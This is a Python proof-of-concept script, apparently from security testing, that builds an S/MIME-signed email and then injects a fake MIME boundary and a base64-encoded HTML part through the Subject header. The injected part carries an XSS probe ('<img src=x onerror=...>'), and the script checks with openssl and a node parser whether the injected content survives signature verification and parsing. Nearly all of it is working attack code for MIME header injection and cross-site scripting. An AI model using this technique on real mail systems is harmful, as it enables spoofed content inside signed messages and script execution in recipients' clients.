import base64, subprocess, os
os.chdir('/tmp/ostest')
B1 = '===============0344718024407626035=='
PWN = '<img src=x onerror="alert(1)">'
b64 = base64.b64encode(PWN.encode()).decode()
# injection text D now starts with a blank line so the outer header block ends immediately
D = ('\n\n--' + B1 + ' \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n'
     + b64 + '\n--' + B1 + '-- ')
payload = ('<!DOCTYPE html><html><body><h1>Re: ' + D + '</h1></body></html>')
inner = ('Content-Type: multipart/mixed; boundary="' + B1 + '"\n'
         'MIME-Version: 1.0\n\n'
         '--' + B1 + '\nContent-Type: text/plain; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
         + payload + '\n'
         '--' + B1 + '\nContent-Type: text/html; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
         + payload + '\n'
         '--' + B1 + '--\n')
open('inner4.txt', 'w').write(inner)
subprocess.run(['openssl', 'cms', '-sign', '-in', 'inner4.txt', '-signer', 'cert.pem', '-inkey', 'key.pem',
                '-outform', 'SMIME', '-out', 'signed4.eml', '-md', 'sha256'], check=True)
raw = open('signed4.eml').read()
# simulate the reply: outer headers with From/To/Subject where the subject carries D
head, rest = raw.split('\n\n', 1)
hdr = head.replace('MIME-Version: 1.0',
                   'MIME-Version: 1.0\nFrom: admin@ses\nTo: admin@ses\nSubject: Re: ' + D)
variant = hdr + '\n' + rest
open('variant4.eml', 'w').write(variant)
open('./_z_496_emls/variant4.eml', 'w').write(variant)
print('--- outer parse of variant4 ---')
p = subprocess.run(['node', './_z_496_parse.js', './_z_496_emls/variant4.eml'],
                   capture_output=True, text=True)
print(p.stdout[:600])
r = subprocess.run(['openssl', 'cms', '-verify', '-in', 'variant4.eml', '-CAfile', 'cert.pem', '-out', 'out4.txt'],
                   capture_output=True, text=True)
print('verify rc', r.returncode, r.stderr.strip()[:200])
if r.returncode == 0:
    open('./_z_496_emls/out4.eml', 'w').write(open('out4.txt').read())
    p2 = subprocess.run(['node', './_z_496_parse.js', './_z_496_emls/out4.eml'],
                        capture_output=True, text=True)
    print('--- parse of verified content ---')
    print(p2.stdout[:600])
